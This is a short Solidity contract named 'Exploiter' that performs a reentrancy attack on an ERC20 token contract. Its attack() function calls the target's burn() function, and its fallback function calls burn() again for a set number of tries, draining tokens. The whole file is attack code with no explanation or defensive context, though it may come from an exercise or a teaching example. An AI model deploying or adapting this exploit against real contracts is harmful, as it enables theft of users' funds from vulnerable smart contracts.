// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./erc20.sol";

contract Exploiter {
    // how much to try to pull out each time.
    uint amount;
    // number of reentrances.
    uint8 tries;
    // contract being exploited
    address payable exploited;

    function attack(address payable vuln, uint _amount, uint8 _tries) public {
        tries = _tries;
        amount = _amount;
        exploited = vuln;
        ERC20(vuln).burn(address(this), amount);
    }

    fallback() external {
        if (tries > 0) {
            tries -= 1;
            ERC20(exploited).burn(address(this), amount);
        }
    }
}